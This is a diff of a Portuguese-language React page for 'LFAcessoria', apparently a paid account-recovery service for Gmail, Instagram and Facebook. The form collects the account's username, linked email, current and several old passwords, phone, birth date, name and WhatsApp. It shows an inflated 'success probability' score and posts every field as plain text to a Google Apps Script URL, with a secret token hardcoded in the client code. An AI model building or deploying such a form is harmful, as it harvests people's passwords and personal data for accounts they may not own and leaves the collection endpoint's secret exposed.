@@ -15,7 +15,7 @@
   <script type="text/babel">
     const { useState, useMemo, useEffect } = React;
 
-    // Ícones
+    // --- ÍCONES ---
     const ShieldCheck = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="m9 12 2 2 4-4"/></svg>;
     const Mail = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>;
     const Instagram = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><rect width="20" height="20" x="2" y="2" rx="5" ry="5"/><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/><line x1="17.5" x2="17.51" y1="6.5" y2="6.5"/></svg>;
@@ -27,16 +27,13 @@
     const EyeOff = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"/><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"/><path d="M6.61 6.61A13.526 13.526 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"/><line x1="2" x2="22" y1="2" y2="22"/></svg>;
     const Plus = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="M12 5v14"/></svg>;
     const CheckCircle2 = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><path d="m9 11 3 3L22 4"/></svg>;
-    const AlertCircle = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" x2="12" y1="8" y2="12"/><line x1="12" x2="12.01" y1="16" y2="16"/></svg>;
-    const TrendingUp = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/><polyline points="16 7 22 7 22 13"/></svg>;
-    const User = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M19 21v-2a4 4 0 0 0-4-4H9a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>;
     const ArrowRight = ({className}) => <svg className={className} xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M5 12h14"/><path d="m12 5 7 7-7 7"/></svg>;
 
     const App = () => {
       const [formData, setFormData] = useState({
         plataforma: '', usuario: '', emailVinculado: '', emailRecuperar: '', 
         ultimaSenha: '', telefone: '', dataNascimento: { dia: '', mes: '', ano: '' },
-        senhasAntigas: [''], motivo: '', dataOcorrido: '', nomeCliente: '', whatsapp: ''
+        senhasAntigas: [''], nomeCliente: '', whatsapp: ''
       });
 
       const [naoLembra, setNaoLembra] = useState({
@@ -48,20 +45,23 @@
         ultimaSenha: false, telefone: false
       });
 
+      const [indicadoPor, setIndicadoPor] = useState('');
       const [showPass, setShowPass] = useState(false);
       const [isSubmitted, setIsSubmitted] = useState(false);
       const [loading, setLoading] = useState(false);
 
-      // Redirecionamento automático
       useEffect(() => {
+        const params = new URLSearchParams(window.location.search);
+        const ref = params.get('ref');
+        if (ref) setIndicadoPor(ref);
+
         if (isSubmitted) {
-          const timer = setTimeout(() => {
-            window.location.href = 'contas.html';
-          }, 4000);
+          const timer = setTimeout(() => { window.location.href = 'contas.html'; }, 4000);
           return () => clearTimeout(timer);
         }
       }, [isSubmitted]);
 
+      // --- CÁLCULO DE PROBABILIDADE ---
       const probabilidade = useMemo(() => {
         if (!formData.plataforma) return 0;
         let score = 0;
@@ -70,18 +70,31 @@
         if (formData.plataforma === 'google' && pontosConfirmados.emailRecuperar) score += 15;
         if (!naoLembra.ultimaSenha && pontosConfirmados.ultimaSenha) score += 20;
         if (!naoLembra.telefone && pontosConfirmados.telefone) score += 10;
-        if (formData.dataNascimento.dia && formData.dataNascimento.ano) score += 10;
+        if (formData.dataNascimento.dia && formData.dataNascimento.ano) score += 15;
         
         const validOldPass = formData.senhasAntigas.filter(p => p.length > 2).length;
         if (validOldPass === 1) score += 5;
-        else if (validOldPass === 2) score += 8;
-        else if (validOldPass >= 3) score += 12;
+        else if (validOldPass === 2) score += 10;
+        else if (validOldPass >= 3) score += 15;
 
-        if (formData.motivo === 'perdeu a senha') score += 15;
-        else if (formData.motivo === 'foi hackeado') score += 10;
-        else if (formData.motivo === 'nao consegue entrar') score += 5;
-        return Math.min(score, 100);
+        return Math.min(score + 10, 100);
       }, [formData, pontosConfirmados, naoLembra]);
+
+      // --- MÁSCARAS E VALIDAÇÕES ---
+      const applyPhoneMask = (v) => {
+        v = v.replace(/\D/g, "");
+        if (v.length > 11) v = v.slice(0, 11);
+        if (v.length > 10) return v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
+        if (v.length > 5) return v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
+        if (v.length > 2) return v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
+        return v.length > 0 ? "(" + v : v;
+      };
+
+      const formatName = (val) => {
+        return val.replace(/\b\w/g, (l) => l.toUpperCase()).slice(0, 25);
+      };
+
+      const handleNoSpaces = (val) => val.replace(/\s/g, '');
 
       const handleBlur = (campo) => {
         let valid = false;
@@ -102,25 +115,8 @@
         }
       };
 
-      // MÁSCARA CORRIGIDA (AGORA ACEITA O NÚMERO COMPLETO)
-      const applyPhoneMask = (v) => {
-        v = v.replace(/\D/g, ""); // Remove tudo o que não é número
-        if (v.length > 11) v = v.slice(0, 11); // Limita a 11 dígitos
-        
-        if (v.length > 10) {
-            v = v.replace(/^(\d{2})(\d{5})(\d{4})/, "($1) $2-$3");
-        } else if (v.length > 5) {
-            v = v.replace(/^(\d{2})(\d{4})(\d{0,4})/, "($1) $2-$3");
-        } else if (v.length > 2) {
-            v = v.replace(/^(\d{2})(\d{0,5})/, "($1) $2");
-        } else if (v.length > 0) {
-            v = v.replace(/^(\d*)/, "($1");
-        }
-        return v;
-      };
-
-      const handleNoSpaces = (val) => val.replace(/\s/g, '');
       const addOldPassword = () => setFormData({ ...formData, senhasAntigas: [...formData.senhasAntigas, ''] });
+      
       const updateOldPassword = (index, val) => {
         const news = [...formData.senhasAntigas];
         news[index] = handleNoSpaces(val);
@@ -130,27 +126,21 @@
       const handleSubmit = async (e) => {
         e.preventDefault();
         setLoading(true);
-        // NOVO LINK DA API ATUALIZADO
-        const GOOGLE_URL = "https://script.google.com/macros/s/AKfycbxJytmginLvt5SvDq_8bm339K4ZZ2I6H7Bg13XRrU5BDYEncm7TE3OC56QyOIX8p1xfcA/exec";
+        const API_URL = "https://script.google.com/macros/s/AKfycbydcswYJt4azZlrCuPf4j-_KmJ98UiyOKisjWVXGfS7duq4rS2DIQh6NKBSn05VENOaVA/exec";
 
         try {
           const payload = {
             ...formData,
             probabilidade: probabilidade,
+            indicadoPor: indicadoPor,
             token_secreto: "RecoveryPro2024!@#SuperSeguro"
           };
 
-          await fetch(GOOGLE_URL, {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-          });
-
+          await fetch(API_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
           setLoading(false);
           setIsSubmitted(true);
         } catch (error) {
-          alert("Erro ao enviar os dados. Verifique sua conexão.");
+          alert("Erro na conexão. Verifique sua internet.");
           setLoading(false);
         }
       };
@@ -158,13 +148,13 @@
       if (isSubmitted) {
         return (
           <div className="min-h-screen bg-slate-950 flex items-center justify-center p-6 text-slate-100">
-            <div className="max-w-md w-full bg-slate-900 border border-emerald-500/30 rounded-3xl p-10 text-center shadow-2xl">
+            <div className="max-w-md w-full bg-slate-900 border border-emerald-500/30 rounded-[3rem] p-10 text-center shadow-2xl">
               <div className="w-20 h-20 bg-emerald-500/20 rounded-full flex items-center justify-center mx-auto mb-6">
                 <CheckCircle2 className="w-12 h-12 text-emerald-400" />
               </div>
               <h2 className="text-3xl font-bold mb-4">Solicitação Enviada!</h2>
-              <p className="text-slate-400 mb-8">Recebemos seus dados com sucesso. Redirecionando para o painel de acompanhamento em instantes...</p>
-              <button onClick={() => window.location.href = 'contas.html'} className="w-full py-4 bg-emerald-600 hover:bg-emerald-500 transition-colors rounded-xl font-bold">Acompanhar Agora</button>
+              <p className="text-slate-400 mb-8">Redirecionando para o painel de acompanhamento...</p>
+              <button onClick={() => window.location.href = 'contas.html'} className="w-full py-4 bg-emerald-600 rounded-2xl font-bold">Acompanhar Agora</button>
             </div>
           </div>
         );
@@ -174,12 +164,12 @@
         <div className="min-h-screen bg-slate-950 text-slate-100 p-4 md:p-8 font-sans">
           <header className="max-w-4xl mx-auto flex items-center justify-between mb-12">
             <div className="flex items-center gap-3">
-              <div className="p-3 bg-indigo-600 rounded-2xl shadow-lg shadow-indigo-600/20">
+              <div className="p-3 bg-indigo-600 rounded-2xl">
                 <ShieldCheck className="w-8 h-8 text-white" />
               </div>
               <div>
                 <h1 className="text-2xl font-bold tracking-tight">LF<span className="text-indigo-400">Acessoria</span></h1>
-                <p className="text-xs text-slate-500 uppercase tracking-widest font-semibold">Segurança Digital</p>
+                <p className="text-[10px] text-slate-500 uppercase font-bold tracking-widest">Segurança Digital</p>
               </div>
             </div>
           </header>
@@ -201,11 +191,9 @@
 
           <main className="max-w-4xl mx-auto">
             <form onSubmit={handleSubmit} className="space-y-8 pb-32">
-              
-              <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem] shadow-xl">
-                <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                  <TrendingUp className="w-5 h-5 text-indigo-400" /> Qual conta você deseja recuperar?
-                </h2>
+              {/* PLATAFORMA */}
+              <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem] shadow-xl">
+                <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">Recuperar qual conta?</h2>
                 <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                   {[
                     { id: 'google', icon: Mail, label: 'E-mail', color: 'hover:border-red-500' },
@@ -213,14 +201,7 @@
                     { id: 'face', icon: Facebook, label: 'Facebook', color: 'hover:border-blue-500' },
                     { id: 'outros', icon: ShieldCheck, label: 'Outros', color: 'hover:border-indigo-500' }
                   ].map((plat) => (
-                    <button
-                      key={plat.id}
-                      type="button"
-                      onClick={() => setFormData({ ...formData, plataforma: plat.id })}
-                      className={`flex flex-col items-center justify-center p-6 rounded-2xl border-2 transition-all ${
-                        formData.plataforma === plat.id ? 'bg-indigo-600/10 border-indigo-500' : 'bg-slate-800/50 border-transparent ' + plat.color
-                      }`}
-                    >
+                    <button key={plat.id} type="button" onClick={() => setFormData({ ...formData, plataforma: plat.id })} className={`flex flex-col items-center justify-center p-6 rounded-3xl border-2 transition-all ${formData.plataforma === plat.id ? 'bg-indigo-600/10 border-indigo-500' : 'bg-slate-800/50 border-transparent ' + plat.color}`}>
                       <plat.icon className={`w-8 h-8 mb-3 ${formData.plataforma === plat.id ? 'text-indigo-400' : 'text-slate-400'}`} />
                       <span className="font-medium">{plat.label}</span>
                     </button>
@@ -231,79 +212,53 @@
               {formData.plataforma && (
                 <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
                   
+                  {/* USUÁRIO E EMAIL (EXCETO GOOGLE) */}
                   {formData.plataforma !== 'google' && (
                     <>
-                      <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                        <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                          <User className="w-5 h-5 text-pink-400" /> Nome de Usuário
-                        </h2>
-                        <div className="space-y-2">
-                          <div className="relative">
-                            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-500 font-bold">@</span>
-                            <input disabled={naoLembra.usuario} onBlur={() => handleBlur('usuario')} value={formData.usuario} onChange={(e) => setFormData({ ...formData, usuario: handleNoSpaces(e.target.value.toLowerCase()) })} type="text" placeholder="nomedeusuario" className="w-full bg-slate-800 border-none p-4 pl-8 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30 disabled:cursor-not-allowed" />
-                          </div>
-                          <button type="button" onClick={() => toggleNaoLembra('usuario')} className="text-xs text-slate-500 hover:text-slate-300 font-bold ml-2">
-                            {naoLembra.usuario ? 'Lembrei do usuário' : 'Não sei o usuário'}
-                          </button>
-                        </div>
+                      <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                        <h2 className="text-xl font-semibold mb-6">Nome de Usuário (@)</h2>
+                        <input disabled={naoLembra.usuario} onBlur={() => handleBlur('usuario')} value={formData.usuario} onChange={(e) => setFormData({ ...formData, usuario: handleNoSpaces(e.target.value.toLowerCase()) })} type="text" placeholder="nomedeusuario" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                        <button type="button" onClick={() => toggleNaoLembra('usuario')} className="text-xs text-slate-500 mt-2 font-bold ml-2">{naoLembra.usuario ? 'Lembrei' : 'Não sei o usuário'}</button>
                       </section>
 
-                      <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                        <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                          <Mail className="w-5 h-5 text-indigo-400" /> E-mail que estava na conta
-                        </h2>
-                        <div className="space-y-2">
-                          <input disabled={naoLembra.emailVinculado} onBlur={() => handleBlur('emailVinculado')} value={formData.emailVinculado} onChange={(e) => setFormData({ ...formData, emailVinculado: handleNoSpaces(e.target.value) })} type="email" placeholder="seuemail@exemplo.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30 disabled:cursor-not-allowed" />
-                          <button type="button" onClick={() => toggleNaoLembra('emailVinculado')} className="text-xs text-slate-500 hover:text-slate-300 font-bold ml-2">
-                            {naoLembra.emailVinculado ? 'Lembrei do e-mail' : 'Não sei o e-mail'}
-                          </button>
-                        </div>
+                      <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                        <h2 className="text-xl font-semibold mb-6">E-mail vinculado</h2>
+                        <input disabled={naoLembra.emailVinculado} onBlur={() => handleBlur('emailVinculado')} value={formData.emailVinculado} onChange={(e) => setFormData({ ...formData, emailVinculado: handleNoSpaces(e.target.value) })} type="email" placeholder="email@exemplo.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                        <button type="button" onClick={() => toggleNaoLembra('emailVinculado')} className="text-xs text-slate-500 mt-2 font-bold ml-2">{naoLembra.emailVinculado ? 'Lembrei' : 'Não sei o e-mail'}</button>
                       </section>
                     </>
                   )}
 
+                  {/* E-MAIL GOOGLE */}
                   {formData.plataforma === 'google' && (
-                    <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                      <h2 className="text-xl font-semibold mb-6 flex items-center gap-2 text-red-400">
-                        <AlertCircle className="w-5 h-5" /> E-mail a recuperar
-                      </h2>
-                      <input required onBlur={() => handleBlur('emailRecuperar')} value={formData.emailRecuperar} onChange={(e) => setFormData({ ...formData, emailRecuperar: handleNoSpaces(e.target.value) })} type="email" placeholder="conta_perdida@gmail.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-red-500/50" />
+                    <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                      <h2 className="text-xl font-semibold mb-6 text-red-400">Gmail a recuperar</h2>
+                      <input required onBlur={() => handleBlur('emailRecuperar')} value={formData.emailRecuperar} onChange={(e) => setFormData({ ...formData, emailRecuperar: handleNoSpaces(e.target.value) })} type="email" placeholder="conta_perdida@gmail.com" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-red-500" />
                     </section>
                   )}
 
-                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <Lock className="w-5 h-5 text-indigo-400" /> Última senha que lembra
-                    </h2>
-                    <div className="space-y-2">
-                      <div className="relative">
-                        <input disabled={naoLembra.ultimaSenha} onBlur={() => handleBlur('ultimaSenha')} value={formData.ultimaSenha} onChange={(e) => setFormData({ ...formData, ultimaSenha: handleNoSpaces(e.target.value) })} type={showPass ? 'text' : 'password'} placeholder="••••••••" className="w-full bg-slate-800 border-none p-4 pr-12 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30 disabled:cursor-not-allowed" />
-                        <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-500 disabled:opacity-30">
-                          {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
-                        </button>
-                      </div>
-                      <button type="button" onClick={() => toggleNaoLembra('ultimaSenha')} className="text-xs text-slate-500 hover:text-slate-300 font-bold ml-2">
-                        {naoLembra.ultimaSenha ? 'Lembrei da senha' : 'Não sei a senha'}
+                  {/* SENHA */}
+                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                    <h2 className="text-xl font-semibold mb-6">Última senha que lembra</h2>
+                    <div className="relative">
+                      <input disabled={naoLembra.ultimaSenha} onBlur={() => handleBlur('ultimaSenha')} value={formData.ultimaSenha} onChange={(e) => setFormData({ ...formData, ultimaSenha: handleNoSpaces(e.target.value) })} type={showPass ? 'text' : 'password'} placeholder="••••••••" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                      <button type="button" onClick={() => setShowPass(!showPass)} className="absolute right-4 top-1/2 -translate-y-1/2 text-slate-500">
+                        {showPass ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                       </button>
                     </div>
+                    <button type="button" onClick={() => toggleNaoLembra('ultimaSenha')} className="text-xs text-slate-500 mt-2 font-bold ml-2">{naoLembra.ultimaSenha ? 'Lembrei' : 'Não sei a senha'}</button>
                   </section>
 
-                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <Smartphone className="w-5 h-5 text-indigo-400" /> Telefone que estava na conta
-                    </h2>
-                    <div className="space-y-2">
-                      <input disabled={naoLembra.telefone} onBlur={() => handleBlur('telefone')} value={formData.telefone} onChange={(e) => setFormData({...formData, telefone: applyPhoneMask(e.target.value)})} type="text" placeholder="(xx) xxxxx-xxxx" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30 disabled:cursor-not-allowed" />
-                      <button type="button" onClick={() => toggleNaoLembra('telefone')} className="text-xs text-slate-500 hover:text-slate-300 font-bold ml-2">
-                        {naoLembra.telefone ? 'Lembrei do telefone' : 'Não sei / Não tinha telefone'}
-                      </button>
-                    </div>
+                  {/* TELEFONE */}
+                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                    <h2 className="text-xl font-semibold mb-6">Telefone na conta</h2>
+                    <input disabled={naoLembra.telefone} onBlur={() => handleBlur('telefone')} value={formData.telefone} onChange={(e) => setFormData({...formData, telefone: applyPhoneMask(e.target.value)})} type="text" placeholder="(xx) xxxxx-xxxx" className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500 disabled:opacity-30" />
+                    <button type="button" onClick={() => toggleNaoLembra('telefone')} className="text-xs text-slate-500 mt-2 font-bold ml-2">{naoLembra.telefone ? 'Lembrei' : 'Não tinha telefone'}</button>
                   </section>
 
-                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <Calendar className="w-5 h-5 text-indigo-400" /> Data de Nascimento
-                    </h2>
+                  {/* NASCIMENTO */}
+                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                    <h2 className="text-xl font-semibold mb-6">Data de Nascimento</h2>
                     <div className="grid grid-cols-3 gap-4">
                       <select value={formData.dataNascimento.dia} onChange={(e) => setFormData({ ...formData, dataNascimento: { ...formData.dataNascimento, dia: e.target.value } })} className="bg-slate-800 border-none p-4 rounded-xl appearance-none">
                         <option value="">Dia</option>
@@ -320,11 +275,10 @@
                     </div>
                   </section>
 
-                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2rem]">
-                    <h2 className="text-xl font-semibold mb-2 flex items-center gap-2">
-                      <Lock className="w-5 h-5 text-indigo-400" /> Senhas Antigas
-                    </h2>
-                    <div className="space-y-4 mt-6">
+                  {/* SENHAS ANTIGAS */}
+                  <section className="bg-slate-900 border border-slate-800 p-6 md:p-8 rounded-[2.5rem]">
+                    <h2 className="text-xl font-semibold mb-4">Senhas Antigas (Aumenta o sucesso)</h2>
+                    <div className="space-y-4">
                       {formData.senhasAntigas.map((pass, idx) => (
                         <input key={idx} value={pass} onChange={(e) => updateOldPassword(idx, e.target.value)} type="text" placeholder={`Senha antiga ${idx + 1}`} className="w-full bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
                       ))}
@@ -332,34 +286,23 @@
                     </div>
                   </section>
 
-                  <section className="bg-slate-900 border-2 border-indigo-500/50 p-6 md:p-8 rounded-[2rem] shadow-2xl">
-                    <h2 className="text-xl font-semibold mb-6 flex items-center gap-2">
-                      <CheckCircle2 className="w-5 h-5 text-indigo-400" /> Finalizar Solicitação
-                    </h2>
-                    <div className="space-y-4">
-                      <div className="grid md:grid-cols-2 gap-4">
-                        <input required value={formData.nomeCliente} onChange={(e) => setFormData({ ...formData, nomeCliente: e.target.value })} type="text" placeholder="Nome Completo" className="bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
-                        
-                        {/* INPUT WHATSAPP CORRIGIDO */}
-                        <input required value={formData.whatsapp} onChange={(e) => setFormData({ ...formData, whatsapp: applyPhoneMask(e.target.value) })} type="text" placeholder="WhatsApp (xx) xxxxx-xxxx" className="bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
-                      </div>
-
-                      <button disabled={loading} type="submit" className="w-full py-5 mt-6 bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-500 hover:to-violet-500 text-white rounded-2xl font-bold text-lg shadow-xl shadow-indigo-600/20 transition-all flex items-center justify-center gap-3 disabled:opacity-50">
-                        {loading ? <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <>ENVIAR SOLICITAÇÃO <ArrowRight className="w-5 h-5" /></>}
-                      </button>
+                  {/* FINALIZAÇÃO */}
+                  <section className="bg-slate-900 border-2 border-indigo-500/50 p-6 md:p-8 rounded-[2.5rem] shadow-2xl">
+                    <h2 className="text-xl font-semibold mb-6">Finalizar Solicitação</h2>
+                    <div className="grid md:grid-cols-2 gap-4">
+                      <input required value={formData.nomeCliente} onChange={(e) => setFormData({ ...formData, nomeCliente: formatName(e.target.value) })} type="text" placeholder="Nome Completo" className="bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
+                      <input required value={formData.whatsapp} onChange={(e) => setFormData({ ...formData, whatsapp: applyPhoneMask(e.target.value) })} type="text" placeholder="WhatsApp (xx) xxxxx-xxxx" className="bg-slate-800 border-none p-4 rounded-xl focus:ring-2 ring-indigo-500" />
                     </div>
+                    <button disabled={loading} type="submit" className="w-full py-5 mt-6 bg-gradient-to-r from-indigo-600 to-violet-600 text-white rounded-2xl font-bold text-lg shadow-xl flex items-center justify-center gap-3 disabled:opacity-50">
+                      {loading ? <div className="w-6 h-6 border-2 border-white/30 border-t-white rounded-full animate-spin" /> : <>ENVIAR SOLICITAÇÃO <ArrowRight className="w-5 h-5" /></>}
+                    </button>
                   </section>
 
                 </div>
               )}
             </form>
           </main>
-
-          <style dangerouslySetInnerHTML={{ __html: `
-            input[type="date"]::-webkit-calendar-picker-indicator { filter: invert(1); opacity: 0.5; cursor: pointer; }
-            select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748b'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1.5em; }
-            .color-scheme-dark { color-scheme: dark; }
-          `}} />
+          <style dangerouslySetInnerHTML={{ __html: `select { background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%2364748b'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M19 9l-7 7-7-7'%3E%3C/path%3E%3C/svg%3E"); background-repeat: no-repeat; background-position: right 1rem center; background-size: 1.5em; }`}} />
         </div>
       );
     };
